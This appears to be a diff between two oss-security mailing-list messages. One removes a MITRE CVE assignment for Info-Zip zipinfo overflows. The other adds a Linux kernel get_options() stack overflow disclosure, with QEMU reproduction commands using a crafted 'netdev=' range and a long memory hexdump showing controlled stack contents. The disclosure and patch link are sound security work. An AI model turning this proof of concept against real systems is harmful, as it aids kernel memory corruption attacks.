@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1941" "Monday" "5" "December" "2016" "17:12:17" "-0500" "cve-assign@mitre.org" "cve-assign@mitre.org" "<1d75d139d90f46fba7f6a0d40d662274@imshyb02.MITRE.ORG>" "58" "[oss-security] Re: CVE Request: Info-Zip zipinfo buffer overflow" nil nil nil "12" "2016120522:12:17" "[oss-security] Re: CVE Request: Info-Zip zipinfo buffer overflow" (number mark "U       cve-assign@m Dec  5   58/1941  " thread-indent "\"[oss-security] Re: CVE Request: Info-Zip zipinfo buffer overflow\"\n") "<93993db8-1bd4-85e5-fe22-06d3a4e44117@canonical.com>" ("<93993db8-1bd4-85e5-fe22-06d3a4e44117@canonical.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4901" "Tuesday" "30" "May" "2017" "08:17:54" "+0400" "Ilya Matveychikov" "matvejchikov@gmail.com" "<EBDB967B-92F8-47B9-AC79-CBF338A835F2@gmail.com>" "131" "[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function" "^Cc:" nil nil "5" "2017053004:17:54" "[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function" (number mark "        matvejchikov May 30  131/4901  " thread-indent "\"[oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 28070 invoked by uid 550); 5 Dec 2016 22:12:31 -0000
+Received: (qmail 21903 invoked by uid 550); 30 May 2017 10:02:05 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,74 +11,173 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 11783 invoked from network); 30 May 2017 04:18:07 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=from:content-transfer-encoding:mime-version:subject:message-id:date
+         :cc:to;
+        bh=RXmtphLSvXCeIJCHILwu7awwwFmzq0gu2kIq5KDofSw=;
+        b=B9b3yXmQICvU+zUjvUridwuXtpXSrp5g/ckxpJq2CnR0mjra71T1L5AqkjmJ+8EFJF
+         FvZkgnuGoifcpkVr6T1wHgwF5LYH/0SqG/elGbB23DCoP5rpGAlmaxDIKsd9ZwBp1ugJ
+         mGUZBPLA/3IcRgEFyhfN4nzV2YHQlZNShYFibSY5H6qBmP7Q2aQG9FTj0AMSsnlgDZ3O
+         yVCLDUSHuk+yfeESTW6mroIF0QUfP+jPS4jEJCvK9Uaew3oaJ6/TRjX4+FP2Oy4yE5uz
+         E1tpk/qUECIua5Q0IQIVLkjP2ud63AHXvziXMvltaVrJOio0MOqDv5tztOfYD5JSbt6J
+         qpsQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:from:content-transfer-encoding:mime-version
+         :subject:message-id:date:cc:to;
+        bh=RXmtphLSvXCeIJCHILwu7awwwFmzq0gu2kIq5KDofSw=;
+        b=h7Se+MY7oqbax0FoEqcdnnLVuCQbAw//geWUyA5OzeQDP/Iohv6ECrJQuXS+sSaX1r
+         tV3tFlAV4YE1AqclEoid9/zbwe3GRqirEzaERr1YEhRTo1gdbW+JA12RiM+1dw4zjvCT
+         Fnt1fkj+NlshRkhYBDik5YTC1pSUTlsO1hdldjg5KxtSwZ9g9f48PFrvYKC35AIRqWjH
+         BbfM+4kP3qGsbQFXAwZJFKBtMQK9Ua/ef39wplUdY7EctUYZrjObP+wDt1OIKaTRwabH
+         oHFmO/++GXqwa9mlVNcCS93rGma4uLROSYoReOR5klqiVRblMxSGbKRkxjlDfuHCLHJa
+         7Q3g==
+X-Gm-Message-State: AODbwcA0M+YMvHHqdxvSZfy5rl6Zqr37RxIAkgw5NvHS4tr+ENlXLLrw
+	y9ckDYiR3Vukd8It6j4=
+X-Received: by 10.28.84.14 with SMTP id i14mr174509wmb.81.1496117876084;
+        Mon, 29 May 2017 21:17:56 -0700 (PDT)
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
+Message-Id: <EBDB967B-92F8-47B9-AC79-CBF338A835F2@gmail.com>
+X-Mailer: Apple Mail (2.3273)
+Cc: Roee Hay <roeehay@gmail.com>
+Date: Tue, 30 May 2017 08:17:54 +0400
+From: Ilya Matveychikov <matvejchikov@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 28042 invoked from network); 5 Dec 2016 22:12:30 -0000
-From: <cve-assign@mitre.org>
-To: <tyhicks@canonical.com>
-CC: <cve-assign@mitre.org>, <oss-security@lists.openwall.com>,
-	<security@ubuntu.com>, <sms@antinode.info>
-In-Reply-To: <93993db8-1bd4-85e5-fe22-06d3a4e44117@canonical.com>
-Message-ID: <1d75d139d90f46fba7f6a0d40d662274@imshyb02.MITRE.ORG>
-Date: Mon, 5 Dec 2016 17:12:17 -0500
-MIME-Version: 1.0
-Content-Type: text/plain
-Subject: [oss-security] Re: CVE Request: Info-Zip zipinfo buffer overflow
+Subject: [oss-security] Linux kernel: stack buffer overflow with controlled payload in get_options() function
+To: oss-security@lists.openwall.com
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hello,
 
-> https://launchpad.net/bugs/1643750
+I=E2=80=99ve found the bug in get_options() function which is used for pars=
+ing
+kernel=E2=80=99s cmdline string. The bug is similar to CVE-2017-1000363 des=
+cribed
+by Roee Hay (https://alephsecurity.com/vulns/aleph-2017023).
 
-> The zipinfo buffer overflow occurs due to a flaw in zipinfo.c's
-> zi_short() function:
+Details
+=3D=3D=3D=3D=3D=3D=3D
 
-> #11 zi_short () at zipinfo.c:1986
-> #12 zipinfo () at zipinfo.c:919
-> #13 0x000000000041144a in do_seekable (lastchance=lastchance@entry=0) at
-> process.c:974
-> #14 0x0000000000411bdf in process_zipfiles () at process.c:401
-> #15 0x0000000000404191 in unzip (argc=0, argv=0x7fffffffe628) at
-> unzip.c:1278
+When using get_options() it's possible to specify a range of numbers,
+like 1-100500. The problem is that it doesn't track array size while
+calling internally to get_range() which iterates over the range and
+fills the memory with numbers.
 
-> The overflow occurs when the two-byte compression method field in the
-> central directory file header is greater then 999.
+Given that one can use =E2=80=9Cnetdev=3Dmin-max=E2=80=9D option to cause s=
+tack overflow
+with controlled payload. Here are some simple steps to reproduce the
+problem in QEMU-based virtual environment:
 
-Use CVE-2016-9844.
+1) Run kernel in QEMU and wait for system halt:
 
+  $ qemu-system-x86_64 -no-reboot -no-shutdown -kernel \
+    /boot/vmlinuz-4.4.0-66-generic -append "netdev=3D3735928559-3735999999"
 
-> consider assigning a CVE to the related
-> `unzip -l` issue from 2014.
+2) After the system halt enter in QEMU console by pressing Ctrl-Alt-2 and d=
+ump
+  all the guest's machine memory:
 
->> http://www.openwall.com/lists/oss-security/2014/11/03/5
->> 
->> list_files() in list.c
->> 
->> sprintf(&methbuf[4], "%03u"
->> 
->> *printf() field-width format specifiers don't restrict the length of the
->> output
+  compat_monitor0 console
+  QEMU 2.5.0 monitor - type 'help' for more information
+  (qemu) dump-gest-memory dump <ENTER>
+  (qemu) quit <ENTER>
 
-Use CVE-2014-9913.
+3) Look for pair of magic numbers (deadbeef,deadbef0) in "dump" file:
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+  $ hexdump -C dump | grep "ef be ad de f0 be ad de"
+  01de42e0  ef be ad de f0 be ad de  f1 be ad de f2 be ad de  |............=
+....|
 
-iQIcBAEBCAAGBQJYReVRAAoJEHb/MwWLVhi2sDQP+wZ1soybVzOtLc5BTXlHE6fD
-48H0AW+qIG6eKrzxUWfi+Boo3xs3mwSqLnqTBrLiqGqbxLk4ssJjFVYvRkEKPAHn
-Y6OeAgO6scW7m9EtP/bZiOuDionz8uS04hZmLq4RgJu/VXjj7SDP1MSHBRHYECZI
-wWpL5NZyBpv8Z2ZAs2Cn92piP4rvAXzVXt5Qxi1ay5O4II+PXYtDkBMlh88r4GVt
-j6+9fjcpuG2S9lG3t7/O4oU99vaCRfDqFgwMZE62J8N3l9Fs+Z6zngr+rGu2m4xr
-kx6Ox5QWsuNVWLGULs6gy7ZI7845dc3HppZEBG+jjN8rhPTtwRWaAgwftsDYIRUW
-ZuUMLWyoTjinvqeAJE6PRhzmYXNfZ4ghMe82+QnF5ssMdJQP/S89EFyJGok7e0Ei
-Ie8qNpOtkm+TByyc161pEYyP3v3oMoMMZMi7znVEg2cR8tupeu7SeX8EvczEtxkI
-4p5wQcZvIFq0ugIaTJ0tHqru5Iw60xCYmitNyd+91PEiO7hT6/5DShXJ90XLt9E5
-ozYURyrOsu5JmAsE7P34vGHQpqAXzU4DJQ3Y8136T798t3o4qUU5zMPV3T7StC5z
-R8yU9YOFetQwToSoEfzulELaYES+GT8jHjf/5q1JFzFBZWQvd8lqBvf/rm7yF3Tm
-qUheoN1jfmydELo6uwea
-=sfNe
------END PGP SIGNATURE-----
+4) Follow address <01de42e0> in hexdump:
+
+  01de42e0  ef be ad de f0 be ad de  f1 be ad de f2 be ad de  |............=
+....|
+  01de42f0  f3 be ad de f4 be ad de  f5 be ad de f6 be ad de  |............=
+....|
+  01de4300  f7 be ad de f8 be ad de  f9 be ad de fa be ad de  |............=
+....|
+  01de4310  fb be ad de fc be ad de  fd be ad de fe be ad de  |............=
+....|
+  01de4320  ff be ad de 00 bf ad de  01 bf ad de 02 bf ad de  |............=
+....|
+  01de4330  03 bf ad de 04 bf ad de  05 bf ad de 06 bf ad de  |............=
+....|
+  01de4340  07 bf ad de 08 bf ad de  09 bf ad de 0a bf ad de  |............=
+....|
+  01de4350  0b bf ad de 0c bf ad de  0d bf ad de 0e bf ad de  |............=
+....|
+  01de4360  0f bf ad de 10 bf ad de  11 bf ad de 12 bf ad de  |............=
+....|
+  01de4370  13 bf ad de 14 bf ad de  15 bf ad de 16 bf ad de  |............=
+....|
+  01de4380  17 bf ad de 18 bf ad de  19 bf ad de 1a bf ad de  |............=
+....|
+  01de4390  1b bf ad de 1c bf ad de  1d bf ad de 1e bf ad de  |............=
+....|
+  01de43a0  1f bf ad de 20 bf ad de  21 bf ad de 22 bf ad de  |.... ...!...=
+"...|
+  01de43b0  23 bf ad de 24 bf ad de  25 bf ad de 26 bf ad de  |#...$...%...=
+&...|
+  01de43c0  27 bf ad de 28 bf ad de  29 bf ad de 2a bf ad de  |'...(...)...=
+*...|
+  01de43d0  2b bf ad de 2c bf ad de  2d bf ad de 2e bf ad de  |+...,...-...=
+....|
+  01de43e0  2f bf ad de 30 bf ad de  31 bf ad de 32 bf ad de  |/...0...1...=
+2...|
+  01de43f0  33 bf ad de 34 bf ad de  35 bf ad de 36 bf ad de  |3...4...5...=
+6...|
+  01de4400  37 bf ad de 38 bf ad de  39 bf ad de 3a bf ad de  |7...8...9...=
+:...|
+  01de4410  3b bf ad de 3c bf ad de  3d bf ad de 3e bf ad de  |;...<...=3D.=
+..>...|
+  01de4420  3f bf ad de 40 bf ad de  41 bf ad de 42 bf ad de  |?...@...A...=
+B...|
+  01de4430  43 bf ad de 44 bf ad de  45 bf ad de 46 bf ad de  |C...D...E...=
+F...|
+  01de4440  47 bf ad de 48 bf ad de  49 bf ad de 4a bf ad de  |G...H...I...=
+J...|
+  01de4450  4b bf ad de 4c bf ad de  4d bf ad de 4e bf ad de  |K...L...M...=
+N...|
+  01de4460  4f bf ad de 50 bf ad de  51 bf ad de 52 bf ad de  |O...P...Q...=
+R...|
+  01de4470  53 bf ad de 54 bf ad de  55 bf ad de 56 bf ad de  |S...T...U...=
+V...|
+  01de4480  57 bf ad de 58 bf ad de  59 bf ad de 5a bf ad de  |W...X...Y...=
+Z...|
+  01de4490  5b bf ad de 5c bf ad de  5d bf ad de 5e bf ad de  |[...\...]...=
+^...|
+  01de44a0  5f bf ad de 60 bf ad de  61 bf ad de 62 bf ad de  |_...`...a...=
+b...|
+  01de44b0  63 bf ad de 64 bf ad de  65 bf ad de 66 bf ad de  |c...d...e...=
+f...|
+  01de44c0  67 bf ad de 68 bf ad de  69 bf ad de 6a bf ad de  |g...h...i...=
+j...|
+  01de44d0  6b bf ad de 6c bf ad de  6d bf ad de 6e bf ad de  |k...l...m...=
+n...|
+  01de44e0  6f bf ad de 70 bf ad de  71 bf ad de 72 bf ad de  |o...p...q...=
+r...|
+  01de44f0  73 bf ad de 74 bf ad de  75 bf ad de 76 bf ad de  |s...t...u...=
+v...|
+  01de4500  77 bf ad de 78 bf ad de  79 bf ad de 7a bf ad de  |w...x...y...=
+z...|
+  01de4510  7b bf ad de 7c bf ad de  7d bf ad de 7e bf ad de  |{...|...}...=
+~...|
+  01de4520  7f bf ad de 80 bf ad de  81 bf ad de 82 bf ad de  |............=
+....|
+  01de4530  83 bf ad de 84 bf ad de  85 bf ad de 86 bf ad de  |............=
+....|
+  01de4540  87 bf ad de 88 bf ad de  89 bf ad de 8a bf ad de  |............=
+....|
+  01de4550  8b bf ad de 8c bf ad de  8d bf ad de 8e bf ad de  |............=
+....|
+  ...
+
+The patch for the bug was submitted by me to LKML list recently:
+https://lkml.org/lkml/2017/5/22/581
+
+This was reported to security@kernel.org, also.
+
+Ilya Matveychikov=
